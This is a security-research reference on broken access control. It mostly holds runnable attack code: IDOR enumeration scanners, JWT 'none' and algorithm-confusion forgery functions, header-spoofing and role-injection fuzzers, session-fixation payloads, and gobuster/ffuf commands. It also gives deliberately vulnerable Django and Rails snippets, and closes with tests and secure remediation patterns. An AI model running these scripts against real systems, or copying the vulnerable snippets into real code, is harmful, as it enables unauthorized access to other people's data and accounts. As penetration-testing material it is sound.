# Access Control Flaws - Security Research Documentation

## Overview

Access control vulnerabilities occur when applications fail to properly enforce restrictions on what authenticated users are allowed to do. These flaws can lead to unauthorized access to data, functionality, and system resources.

**OWASP Classification**: A01:2021 - Broken Access Control (Top 1 in OWASP Top 10)

---

## 1. Horizontal Privilege Escalation

Horizontal privilege escalation occurs when a user can access resources or functionality belonging to another user at the same privilege level.

### 1.1 IDOR (Insecure Direct Object Reference) Patterns

IDOR vulnerabilities occur when an application uses user-controllable input to access objects directly without proper authorization checks.

#### Common IDOR Patterns

```
# Numeric Sequential IDs
GET /api/users/1001/profile
GET /api/orders/50234
GET /api/invoices/2024-0001

# UUID-based (less predictable but still vulnerable)
GET /api/documents/550e8400-e29b-41d4-a716-446655440000

# Encoded IDs (Base64, Hex)
GET /api/files/dXNlcjoxMjM0  # Base64 encoded "user:1234"
GET /api/records/0x7B2275736572223A31323334  # Hex encoded

# Hash-based References
GET /api/download/5d41402abc4b2a76b9719d911017c592  # MD5 hash

# Composite Keys
GET /api/tenant/acme/user/john.doe
GET /api/org/123/project/456/task/789
```

#### IDOR Attack Techniques

```python
# Python - IDOR Enumeration Script
import requests
import concurrent.futures

class IDORScanner:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.headers = {"Authorization": f"Bearer {auth_token}"}
        self.session = requests.Session()

    def enumerate_numeric_ids(self, endpoint_template, start_id, end_id):
        """Enumerate numeric IDs for IDOR testing"""
        vulnerable_ids = []

        for id_value in range(start_id, end_id + 1):
            url = endpoint_template.format(id=id_value)
            response = self.session.get(
                f"{self.base_url}{url}",
                headers=self.headers
            )

            if response.status_code == 200:
                # Check if response contains other user's data
                data = response.json()
                if self.is_other_user_data(data):
                    vulnerable_ids.append({
                        'id': id_value,
                        'data_preview': str(data)[:200]
                    })

        return vulnerable_ids

    def decode_and_manipulate(self, encoded_id, encoding_type='base64'):
        """Decode, manipulate, and re-encode IDs"""
        import base64
        import json

        if encoding_type == 'base64':
            decoded = base64.b64decode(encoded_id).decode('utf-8')

            # Try to parse as JSON and manipulate
            try:
                data = json.loads(decoded)
                # Increment numeric fields
                for key, value in data.items():
                    if isinstance(value, int):
                        data[key] = value + 1
                return base64.b64encode(json.dumps(data).encode()).decode()
            except:
                return None

    def uuid_manipulation(self, uuid_string):
        """Generate UUID variants for testing"""
        import uuid

        variants = []
        # Parse the UUID
        u = uuid.UUID(uuid_string)

        # Generate nearby UUIDs (for sequential UUID1)
        for i in range(-5, 6):
            if i != 0:
                try:
                    new_int = int(u) + i
                    variants.append(str(uuid.UUID(int=new_int)))
                except:
                    pass

        return variants

# Usage
scanner = IDORScanner("https://target.com", "user_jwt_token")
vulnerabilities = scanner.enumerate_numeric_ids("/api/users/{id}/profile", 1, 1000)
```

#### Burp Suite IDOR Testing

```
# Burp Intruder - Cluster Bomb Attack for IDOR
# Position markers for user_id parameter

GET /api/users/[PAYLOAD1]/documents/[PAYLOAD2] HTTP/1.1
Host: target.com
Authorization: Bearer user_token

# Payload 1: User IDs (1-10000)
# Payload 2: Document IDs (1-1000)

# Grep - Match for sensitive data indicators
- "email"
- "ssn"
- "credit_card"
- "password"
- "@"
```

### 1.2 Parameter Manipulation

#### URL Parameter Tampering

```
# Original Request
GET /dashboard?user_id=current_user

# Attack Variations
GET /dashboard?user_id=admin
GET /dashboard?user_id=1
GET /dashboard?user_id[]=1&user_id[]=2
GET /dashboard?user_id=../../../admin

# POST Body Manipulation
POST /api/update-profile
Content-Type: application/json

{"user_id": "victim_id", "email": "attacker@evil.com"}

# Hidden Form Field Manipulation
<input type="hidden" name="account_id" value="12345">
# Change to: value="67890"
```

#### Mass Assignment Exploitation

```python
# Vulnerable Django Model
class User(models.Model):
    username = models.CharField(max_length=100)
    email = models.EmailField()
    is_admin = models.BooleanField(default=False)
    balance = models.DecimalField(max_digits=10, decimal_places=2)

# Vulnerable View
def update_profile(request):
    user = request.user
    for key, value in request.POST.items():
        setattr(user, key, value)  # VULNERABLE
    user.save()

# Attack Payload
POST /update-profile
is_admin=true&balance=999999.99
```

```ruby
# Vulnerable Rails Controller
class UsersController < ApplicationController
  def update
    @user = User.find(params[:id])
    @user.update(params[:user])  # VULNERABLE - no strong params
  end
end

# Attack Payload
PATCH /users/1
user[role]=admin&user[account_balance]=1000000
```

### 1.3 Cookie/Session Manipulation

#### Session Token Analysis

```python
# JWT Token Manipulation
import jwt
import base64
import json

def analyze_jwt(token):
    """Analyze and attempt to manipulate JWT tokens"""
    parts = token.split('.')

    # Decode header
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    print(f"Algorithm: {header.get('alg')}")

    # Decode payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    print(f"Payload: {json.dumps(payload, indent=2)}")

    return header, payload

def forge_jwt_none_algorithm(original_token, new_payload):
    """Exploit 'none' algorithm vulnerability"""
    header = {"alg": "none", "typ": "JWT"}

    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')

    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(new_payload).encode()
    ).decode().rstrip('=')

    # Token with empty signature
    return f"{header_b64}.{payload_b64}."

def exploit_algorithm_confusion(original_token, public_key):
    """RS256 to HS256 algorithm confusion attack"""
    parts = original_token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

    # Modify payload
    payload['role'] = 'admin'
    payload['user_id'] = 1

    # Sign with public key using HS256
    return jwt.encode(payload, public_key, algorithm='HS256')

# Cookie Manipulation
def manipulate_session_cookie(cookie_value):
    """Attempt common cookie manipulations"""
    manipulations = []

    # Base64 decode attempt
    try:
        decoded = base64.b64decode(cookie_value)
        manipulations.append(('base64', decoded))
    except:
        pass

    # URL decode attempt
    from urllib.parse import unquote
    manipulations.append(('urldecode', unquote(cookie_value)))

    # Check for serialized data
    if b'O:' in decoded or b'a:' in decoded:
        print("PHP serialization detected!")
    if b'rO0' in cookie_value.encode():
        print("Java serialization detected!")

    return manipulations
```

#### Session Fixation Attacks

```
# Session Fixation via URL
https://target.com/login?PHPSESSID=attacker_controlled_session

# Session Fixation via Cookie Injection
<script>document.cookie="JSESSIONID=attacker_session; domain=target.com"</script>

# Session Fixation via Meta Tag
<meta http-equiv="Set-Cookie" content="sessionid=attacker_session">
```

### 1.4 API Access Control Bypass

#### GraphQL Authorization Bypass

```graphql
# Introspection Query (if enabled)
{
  __schema {
    types {
      name
      fields {
        name
        args { name type { name } }
      }
    }
  }
}

# Direct Object Access via GraphQL
query {
  user(id: "other_user_id") {
    id
    email
    sensitiveData
    privateDocuments {
      content
    }
  }
}

# Nested Query Authorization Bypass
query {
  publicPost(id: "123") {
    title
    author {
      # May bypass user-level authorization
      privateData
      ssn
      bankAccount
    }
  }
}

# Batching Attack
[
  {"query": "query { user(id: \"1\") { email } }"},
  {"query": "query { user(id: \"2\") { email } }"},
  {"query": "query { user(id: \"3\") { email } }"}
]
```

#### REST API Authorization Bypass

```bash
# HTTP Method Tampering
GET /api/admin/users → 403 Forbidden
POST /api/admin/users → 200 OK (might bypass)
PUT /api/admin/users → 200 OK
PATCH /api/admin/users → 200 OK

# Path Traversal in API
GET /api/users/../admin/config
GET /api/v1/users/../../v2/admin/secrets

# API Version Manipulation
GET /api/v2/users/1 → 403 Forbidden
GET /api/v1/users/1 → 200 OK (old version lacks controls)

# Content-Type Manipulation
POST /api/admin/create
Content-Type: application/json → 403
Content-Type: application/x-www-form-urlencoded → 200 OK
```

---

## 2. Vertical Privilege Escalation

Vertical privilege escalation occurs when a user can gain access to functionality or resources reserved for higher-privileged users.

### 2.1 Role Manipulation

#### Role Parameter Tampering

```http
# Registration with Role Injection
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "password": "password123",
  "email": "attacker@evil.com",
  "role": "admin"
}

# Profile Update Role Escalation
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{
  "name": "John Doe",
  "role_id": 1,
  "is_superuser": true,
  "permissions": ["*"]
}

# JWT Role Claim Manipulation
# Original: {"user_id": 123, "role": "user"}
# Forged:   {"user_id": 123, "role": "admin"}
```

#### Framework-Specific Role Vulnerabilities

```python
# Django - Vulnerable Permission Check
from django.contrib.auth.decorators import user_passes_test

def is_admin(user):
    return user.profile.role == 'admin'  # Only checks role string

@user_passes_test(is_admin)
def admin_dashboard(request):
    # Attacker can manipulate their profile.role
    pass

# Secure Alternative
from django.contrib.admin.views.decorators import staff_member_required

@staff_member_required
def admin_dashboard(request):
    # Uses Django's built-in staff check
    pass
```

```java
// Spring Security - Role Hierarchy Bypass
// Vulnerable Configuration
@PreAuthorize("hasRole('USER')")
public void userFunction() {
    // ADMIN should have access but config is wrong
}

@PreAuthorize("hasRole('ADMIN')")
public void adminFunction() {
    // Missing role hierarchy configuration
}

// Attack: Modify role in JWT/session
// Spring doesn't verify role against backend on each request
```

### 2.2 Admin Function Access

#### Hidden Admin Endpoint Discovery

```bash
# Common Admin Paths - Fuzzing List
/admin
/administrator
/admin-console
/admin.php
/wp-admin
/backend
/management
/system
/dashboard
/control
/cpanel
/_admin
/admin_area
/siteadmin
/adminpanel

# API Admin Endpoints
/api/admin
/api/v1/admin
/api/internal
/api/management
/api/system
/api/debug
/api/swagger
/api/graphql  # May expose admin mutations

# Gobuster/FFuF Discovery
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50

ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302,403
```

#### Admin Panel Bypass Techniques

```http
# Header Manipulation for Admin Access
GET /admin HTTP/1.1
Host: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1

# URL Manipulation
/admin → 403
/Admin → 200
/ADMIN → 200
/admin/ → 200
/admin/. → 200
/./admin → 200
/admin..;/ → 200
/%2fadmin → 200
/admin%20 → 200
/admin%09 → 200

# HTTP Method Override
POST /admin HTTP/1.1
X-HTTP-Method-Override: GET
X-HTTP-Method: GET
X-Method-Override: GET
```

### 2.3 Privilege Parameter Injection

```python
# Identifying Injectable Parameters
injectable_params = [
    'admin', 'is_admin', 'isAdmin', 'administrator',
    'role', 'role_id', 'roleId', 'roles',
    'privilege', 'privileges', 'priv',
    'access_level', 'accessLevel', 'access',
    'group', 'group_id', 'groupId', 'groups',
    'permission', 'permissions', 'perms',
    'user_type', 'userType', 'type',
    'account_type', 'accountType',
    'is_staff', 'isStaff', 'staff',
    'is_superuser', 'isSuperuser', 'superuser',
    'can_admin', 'canAdmin',
    'debug', 'is_debug', 'test'
]

# Automated Parameter Injection Test
def test_privilege_injection(base_request, params_to_test):
    results = []

    for param in params_to_test:
        for value in [True, 'true', '1', 'yes', 'admin', 'root']:
            test_request = base_request.copy()
            test_request['data'][param] = value

            response = requests.post(**test_request)

            if response.status_code == 200:
                # Check for privilege indicators in response
                if 'admin' in response.text.lower():
                    results.append({
                        'param': param,
                        'value': value,
                        'indicator': 'admin keyword in response'
                    })

    return results
```

### 2.4 Missing Function-Level Access Control

#### Detection Methodology

```python
# Python - Function-Level Access Control Tester
import requests
from urllib.parse import urljoin

class FunctionAccessTester:
    def __init__(self, base_url, low_priv_token, high_priv_token=None):
        self.base_url = base_url
        self.low_priv_headers = {"Authorization": f"Bearer {low_priv_token}"}
        self.high_priv_headers = {"Authorization": f"Bearer {high_priv_token}"} if high_priv_token else None

    def compare_access(self, endpoints):
        """Compare access between low and high privilege users"""
        results = []

        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint['path'])
            method = endpoint.get('method', 'GET')

            # Test with low privilege
            low_response = requests.request(
                method, url, headers=self.low_priv_headers
            )

            # Test with high privilege (if available)
            high_response = None
            if self.high_priv_headers:
                high_response = requests.request(
                    method, url, headers=self.high_priv_headers
                )

            if low_response.status_code == 200:
                results.append({
                    'endpoint': endpoint,
                    'low_priv_status': low_response.status_code,
                    'high_priv_status': high_response.status_code if high_response else 'N/A',
                    'vulnerability': 'POTENTIAL - Low priv user has access'
                })

        return results

# Test administrative functions
admin_endpoints = [
    {'path': '/api/admin/users', 'method': 'GET'},
    {'path': '/api/admin/settings', 'method': 'GET'},
    {'path': '/api/admin/logs', 'method': 'GET'},
    {'path': '/api/users/1/delete', 'method': 'DELETE'},
    {'path': '/api/system/config', 'method': 'GET'},
    {'path': '/api/debug/info', 'method': 'GET'},
]

tester = FunctionAccessTester("https://target.com", "low_priv_jwt")
vulnerabilities = tester.compare_access(admin_endpoints)
```

---

## 3. Context-Based Access Control

### 3.1 Time-Based Bypass

```python
# Time-Based Access Control Bypass Techniques

import time
from datetime import datetime, timedelta
import pytz

class TimeBasedBypass:
    def test_timezone_manipulation(self, endpoint, auth_token):
        """Test timezone header manipulation"""
        headers = {"Authorization": f"Bearer {auth_token}"}
        timezones_to_test = [
            'UTC', 'America/New_York', 'Asia/Tokyo',
            'Pacific/Auckland', 'Etc/GMT+12', 'Etc/GMT-12'
        ]

        for tz in timezones_to_test:
            headers['X-Timezone'] = tz
            headers['TZ'] = tz
            response = requests.get(endpoint, headers=headers)
            print(f"{tz}: {response.status_code}")

    def test_time_header_injection(self, endpoint, auth_token):
        """Test time-related header injection"""
        headers = {"Authorization": f"Bearer {auth_token}"}

        # Various time header manipulations
        time_headers = {
            'Date': 'Mon, 01 Jan 2024 12:00:00 GMT',
            'X-Date': '2024-01-01T12:00:00Z',
            'X-Timestamp': str(int(time.time()) + 86400),  # Tomorrow
            'X-Request-Time': '2024-01-01 12:00:00',
            'If-Modified-Since': 'Mon, 01 Jan 2024 00:00:00 GMT',
            'If-Unmodified-Since': 'Mon, 01 Jan 2099 00:00:00 GMT',
        }

        for header, value in time_headers.items():
            headers[header] = value
            response = requests.get(endpoint, headers=headers)
            print(f"{header}: {value} -> {response.status_code}")

    def race_condition_time_bypass(self, endpoint, auth_token, num_threads=50):
        """Attempt race condition during time transition"""
        import concurrent.futures

        results = []

        def make_request():
            response = requests.get(
                endpoint,
                headers={"Authorization": f"Bearer {auth_token}"}
            )
            return response.status_code, time.time()

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(make_request) for _ in range(num_threads)]
            for future in concurrent.futures.as_completed(futures):
                results.append(future.result())

        return results
```

### 3.2 Location-Based Bypass

```bash
# IP Geolocation Bypass Headers
curl -X GET "https://target.com/geo-restricted" \
  -H "X-Forwarded-For: 8.8.8.8" \
  -H "X-Real-IP: 8.8.8.8" \
  -H "X-Originating-IP: 8.8.8.8" \
  -H "X-Client-IP: 8.8.8.8" \
  -H "CF-Connecting-IP: 8.8.8.8" \
  -H "True-Client-IP: 8.8.8.8" \
  -H "X-Cluster-Client-IP: 8.8.8.8"

# VPN/Proxy Detection Bypass
# Use residential proxies to avoid detection
# Rotate IP addresses from target geolocation
```

```python
# Location Header Fuzzer
location_headers = {
    'X-Forwarded-For': ['127.0.0.1', '8.8.8.8', '192.168.1.1'],
    'X-Real-IP': ['127.0.0.1', '8.8.8.8'],
    'X-Originating-IP': ['127.0.0.1'],
    'X-Remote-IP': ['127.0.0.1'],
    'X-Remote-Addr': ['127.0.0.1'],
    'X-Client-IP': ['127.0.0.1', '10.0.0.1'],
    'X-Host': ['localhost', '127.0.0.1'],
    'X-Forwarded-Host': ['localhost'],
    'CF-Connecting-IP': ['8.8.8.8'],
    'True-Client-IP': ['8.8.8.8'],
    'Forwarded': ['for=127.0.0.1', 'for=8.8.8.8'],
}

def test_location_bypass(endpoint, auth_headers):
    for header, values in location_headers.items():
        for value in values:
            test_headers = auth_headers.copy()
            test_headers[header] = value
            response = requests.get(endpoint, headers=test_headers)
            if response.status_code == 200:
                print(f"[BYPASS] {header}: {value}")
```

### 3.3 IP-Based Bypass

```python
# IP-Based Access Control Bypass
class IPBypassTester:
    def __init__(self, target_url):
        self.target = target_url
        self.internal_ips = [
            '127.0.0.1', 'localhost', '::1',
            '10.0.0.1', '10.0.0.0', '10.255.255.255',
            '172.16.0.1', '172.31.255.255',
            '192.168.0.1', '192.168.1.1', '192.168.255.255',
            '0.0.0.0', '0',
            '127.0.0.0', '127.255.255.255',
            '2130706433',  # 127.0.0.1 in decimal
            '0x7f000001',  # 127.0.0.1 in hex
            '017700000001',  # 127.0.0.1 in octal
        ]

        self.ip_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Originating-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Client-IP',
            'Client-IP',
            'Forwarded',
            'Forwarded-For',
            'X-Forwarded',
            'X-Forwarded-By',
            'X-Forwarded-For-Original',
            'X-Forwarder-For',
            'X-Forward-For',
            'Via',
            'X-From',
            'X-Host',
            'X-Custom-IP-Authorization',
        ]

    def test_all_combinations(self):
        results = []
        for header in self.ip_headers:
            for ip in self.internal_ips:
                headers = {header: ip}
                try:
                    response = requests.get(self.target, headers=headers, timeout=5)
                    if response.status_code == 200:
                        results.append({
                            'header': header,
                            'ip': ip,
                            'status': response.status_code
                        })
                except:
                    pass
        return results

# DNS Rebinding for IP Bypass
# 1. Set up malicious DNS that initially resolves to attacker IP
# 2. After initial check, TTL expires and resolves to internal IP
# 3. Application makes second request to internal resource
```

### 3.4 Device-Based Bypass

```python
# Device/User-Agent Based Access Control Bypass
user_agents = {
    'mobile_ios': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
    'mobile_android': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
    'desktop_chrome': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'desktop_firefox': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'bot_google': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'internal_tool': 'InternalMonitoring/1.0',
    'admin_client': 'AdminClient/1.0',
    'api_client': 'API-Client/1.0',
    'empty': '',
    'null': 'null',
}

def test_device_bypass(endpoint, auth_headers):
    for name, ua in user_agents.items():
        headers = auth_headers.copy()
        headers['User-Agent'] = ua
        response = requests.get(endpoint, headers=headers)
        print(f"{name}: {response.status_code}")

# Client Certificate Bypass
# Test endpoints that require client certificates
# Try accessing without certificate or with expired cert
```

---

## 4. Access Control Models Vulnerabilities

### 4.1 RBAC (Role-Based Access Control) Flaws

```python
# Common RBAC Vulnerabilities

# 1. Role Hierarchy Bypass
class RBACVulnerabilities:
    """
    RBAC Flaw Types:
    - Missing role validation
    - Role inheritance issues
    - Circular role references
    - Role caching problems
    - Inconsistent role enforcement
    """

    def test_role_hierarchy_bypass(self, api_endpoint, user_token):
        """Test if role hierarchy is properly enforced"""
        # Test if lower role can access higher role resources
        roles_to_test = ['guest', 'user', 'moderator', 'admin', 'superadmin']

        results = []
        for role in roles_to_test:
            # Attempt to claim different roles
            response = requests.get(
                api_endpoint,
                headers={
                    'Authorization': f'Bearer {user_token}',
                    'X-Role': role,
                    'X-Requested-Role': role
                }
            )
            results.append({'role': role, 'status': response.status_code})

        return results

    def test_role_assignment_bypass(self, api_endpoint, user_token):
        """Test if users can assign themselves roles"""
        payloads = [
            {'role': 'admin'},
            {'roles': ['admin', 'superadmin']},
            {'role_ids': [1]},  # Often admin is role_id 1
            {'group': 'administrators'},
            {'permissions': ['*']},
        ]

        for payload in payloads:
            response = requests.put(
                f"{api_endpoint}/profile",
                headers={'Authorization': f'Bearer {user_token}'},
                json=payload
            )
            if response.status_code == 200:
                print(f"Potential vulnerability: {payload}")
```

#### Django RBAC Vulnerabilities

```python
# Vulnerable Django Permission Check
class VulnerableView(View):
    def get(self, request):
        # BAD: Client-supplied role
        if request.GET.get('role') == 'admin':
            return self.admin_view(request)

        # BAD: Cached permission (may be stale)
        if request.session.get('is_admin'):
            return self.admin_view(request)

# Secure Django Permission Check
from django.contrib.auth.mixins import PermissionRequiredMixin

class SecureView(PermissionRequiredMixin, View):
    permission_required = 'app.can_access_admin'

    def get(self, request):
        # Permission checked against database
        return self.admin_view(request)
```

### 4.2 ABAC (Attribute-Based Access Control) Flaws

```python
# ABAC Policy Bypass Techniques

class ABACBypass:
    """
    ABAC vulnerabilities occur when attribute evaluation is flawed
    """

    def test_attribute_injection(self, endpoint, token):
        """Inject attributes via various channels"""

        # Header-based attribute injection
        headers = {
            'Authorization': f'Bearer {token}',
            'X-User-Department': 'IT',
            'X-User-Clearance': 'TOP_SECRET',
            'X-User-Location': 'HQ',
            'X-User-Role': 'admin',
        }

        response = requests.get(endpoint, headers=headers)
        return response

    def test_attribute_type_confusion(self, endpoint, token):
        """Test type confusion in attribute evaluation"""

        payloads = [
            {'clearance_level': '5'},      # String instead of int
            {'clearance_level': [5]},       # Array instead of int
            {'clearance_level': {'value': 5}},  # Object instead of int
            {'clearance_level': True},      # Boolean that evaluates to 1
            {'clearance_level': '5e0'},     # Scientific notation
        ]

        for payload in payloads:
            response = requests.post(
                endpoint,
                headers={'Authorization': f'Bearer {token}'},
                json=payload
            )
            if response.status_code == 200:
                print(f"Type confusion bypass: {payload}")

    def test_policy_evaluation_order(self, endpoint, token):
        """Test if policy evaluation order can be exploited"""
        # Some ABAC systems process rules in order
        # and first match wins

        # Try to satisfy a permissive rule before restrictive ones
        pass
```

### 4.3 DAC (Discretionary Access Control) Issues

```python
# DAC Vulnerability Testing

class DACVulnerabilities:
    """
    DAC flaws where owners control access to resources
    """

    def test_ownership_manipulation(self, endpoint, token):
        """Test if resource ownership can be manipulated"""

        payloads = [
            {'owner_id': 'attacker_id'},
            {'created_by': 'attacker_id'},
            {'user_id': 'attacker_id'},
            {'acl': [{'user': 'attacker_id', 'permission': 'full'}]},
        ]

        for payload in payloads:
            response = requests.patch(
                endpoint,
                headers={'Authorization': f'Bearer {token}'},
                json=payload
            )
            if response.status_code == 200:
                print(f"Ownership manipulation: {payload}")

    def test_acl_bypass(self, resource_endpoint, token):
        """Test ACL bypass techniques"""

        # Try to access resource with ACL manipulation
        manipulations = [
            '?acl=public',
            '?share=true',
            '?access=all',
            '?private=false',
        ]

        for param in manipulations:
            response = requests.get(
                f"{resource_endpoint}{param}",
                headers={'Authorization': f'Bearer {token}'}
            )
            if response.status_code == 200:
                print(f"ACL bypass: {param}")
```

### 4.4 MAC (Mandatory Access Control) Bypass

```python
# MAC Bypass Techniques

class MACBypass:
    """
    MAC systems enforce access based on security labels
    Bypasses are rare but possible through label manipulation
    """

    def test_label_manipulation(self, endpoint, token):
        """Test security label manipulation"""

        # Security labels often sent in headers
        headers = {
            'Authorization': f'Bearer {token}',
            'X-Security-Label': 'TOP_SECRET',
            'X-Clearance': 'TS/SCI',
            'X-Classification': 'UNCLASSIFIED',
            'Security-Label': 'PUBLIC',
        }

        response = requests.get(endpoint, headers=headers)
        return response

    def test_downgrade_attack(self, endpoint, token, resource_id):
        """Attempt to downgrade resource classification"""

        # Try to change resource classification
        payloads = [
            {'classification': 'public'},
            {'security_level': 0},
            {'clearance_required': 'none'},
            {'access_level': 'unrestricted'},
        ]

        for payload in payloads:
            response = requests.patch(
                f"{endpoint}/{resource_id}",
                headers={'Authorization': f'Bearer {token}'},
                json=payload
            )
            if response.status_code == 200:
                print(f"Downgrade attack possible: {payload}")
```

---

## 5. Detection and Testing Tools

### 5.1 Automated Tools

```bash
# Burp Suite Extensions for Access Control Testing
# - Autorize (automatic authorization testing)
# - AuthMatrix (access control matrix visualization)
# - Auto Repeater (automatic request modification)

# OWASP ZAP Access Control Testing
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' https://target.com

# Nuclei Templates for Access Control
nuclei -u https://target.com -t exposures/
nuclei -u https://target.com -t vulnerabilities/generic/
nuclei -u https://target.com -tags auth,authz

# Custom Authorization Testing
# Use ffuf with authenticated sessions
ffuf -u https://target.com/api/FUZZ -w admin-endpoints.txt \
  -H "Cookie: session=user_session" \
  -mc 200,201,204 \
  -o results.json

# Arjun - Parameter Discovery
arjun -u https://target.com/api/endpoint -m POST -oJ params.json
```

### 5.2 Manual Testing Checklist

```markdown
## Access Control Testing Checklist

### Horizontal Access Control
- [ ] Test IDOR with numeric IDs
- [ ] Test IDOR with UUIDs
- [ ] Test IDOR with encoded/hashed IDs
- [ ] Test parameter manipulation (user_id, account_id)
- [ ] Test cookie/session token manipulation
- [ ] Test API endpoints with different user tokens

### Vertical Access Control
- [ ] Test admin endpoints with regular user
- [ ] Test role parameter injection
- [ ] Test hidden admin functionality discovery
- [ ] Test privilege escalation via mass assignment
- [ ] Test function-level access controls

### Context-Based Controls
- [ ] Test time-based restrictions bypass
- [ ] Test IP-based restrictions bypass
- [ ] Test geolocation restrictions bypass
- [ ] Test device-based restrictions bypass

### Access Control Models
- [ ] Test RBAC role manipulation
- [ ] Test ABAC attribute injection
- [ ] Test DAC ownership bypass
- [ ] Test ACL manipulation
```

### 5.3 Framework-Specific Testing

```python
# Django Testing
from django.test import TestCase, Client
from django.contrib.auth.models import User

class AccessControlTest(TestCase):
    def setUp(self):
        self.admin = User.objects.create_superuser('admin', 'admin@test.com', 'pass')
        self.user = User.objects.create_user('user', 'user@test.com', 'pass')
        self.client = Client()

    def test_admin_endpoint_as_user(self):
        self.client.login(username='user', password='pass')
        response = self.client.get('/admin/users/')
        self.assertEqual(response.status_code, 403)

    def test_other_user_data(self):
        self.client.login(username='user', password='pass')
        response = self.client.get(f'/api/users/{self.admin.id}/profile/')
        self.assertEqual(response.status_code, 403)
```

```java
// Spring Security Testing
@SpringBootTest
@AutoConfigureMockMvc
public class AccessControlTests {

    @Autowired
    private MockMvc mockMvc;

    @Test
    @WithMockUser(roles = "USER")
    public void adminEndpointShouldBeForbiddenForUser() throws Exception {
        mockMvc.perform(get("/api/admin/users"))
            .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(roles = "ADMIN")
    public void adminEndpointShouldBeAllowedForAdmin() throws Exception {
        mockMvc.perform(get("/api/admin/users"))
            .andExpect(status().isOk());
    }
}
```

---

## 6. Remediation Guidelines

### 6.1 Secure Access Control Patterns

```python
# Django - Secure Object-Level Permissions
from rest_framework import permissions

class IsOwnerOrAdmin(permissions.BasePermission):
    def has_object_permission(self, request, view, obj):
        # Admin can access anything
        if request.user.is_staff:
            return True
        # Users can only access their own objects
        return obj.owner == request.user

class SecureViewSet(viewsets.ModelViewSet):
    permission_classes = [IsAuthenticated, IsOwnerOrAdmin]

    def get_queryset(self):
        # Filter queryset to only show user's own objects
        if self.request.user.is_staff:
            return self.model.objects.all()
        return self.model.objects.filter(owner=self.request.user)
```

```javascript
// Express.js - Middleware-Based Access Control
const checkOwnership = async (req, res, next) => {
    const resource = await Resource.findById(req.params.id);

    if (!resource) {
        return res.status(404).json({ error: 'Not found' });
    }

    if (resource.owner.toString() !== req.user.id && !req.user.isAdmin) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    req.resource = resource;
    next();
};

const checkRole = (...roles) => {
    return (req, res, next) => {
        if (!roles.includes(req.user.role)) {
            return res.status(403).json({ error: 'Insufficient privileges' });
        }
        next();
    };
};

// Usage
app.get('/api/resources/:id', authenticate, checkOwnership, getResource);
app.delete('/api/admin/users/:id', authenticate, checkRole('admin'), deleteUser);
```

### 6.2 Security Headers and Configurations

```nginx
# Nginx - Security Headers for Access Control
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'" always;

# IP-based access control (properly configured)
location /admin {
    allow 10.0.0.0/8;
    allow 192.168.0.0/16;
    deny all;

    # Double-check at application level too
    proxy_pass http://backend;
}
```

---

## References

- OWASP Testing Guide: Authorization Testing
- OWASP Top 10 2021 - A01:2021 Broken Access Control
- PortSwigger Web Security Academy - Access Control
- NIST SP 800-162 - Guide to Attribute Based Access Control
- CWE-284: Improper Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
